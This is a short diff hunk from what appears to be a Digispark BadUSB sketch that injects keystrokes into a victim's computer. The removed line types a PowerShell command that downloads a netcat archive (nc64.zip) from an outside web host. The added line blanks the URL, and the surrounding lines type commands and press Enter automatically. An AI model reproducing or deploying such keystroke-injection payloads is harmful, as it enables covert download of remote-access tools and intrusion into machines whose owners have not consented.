@@ -18,7 +18,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Invoke-Webrequest -URI 'https://ieucyber.com/archive/nc64.zip' -Outfile 'nc.zip'");
+  DigiKeyboard.print("Invoke-Webrequest -URI '' -Outfile 'nc.zip'");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
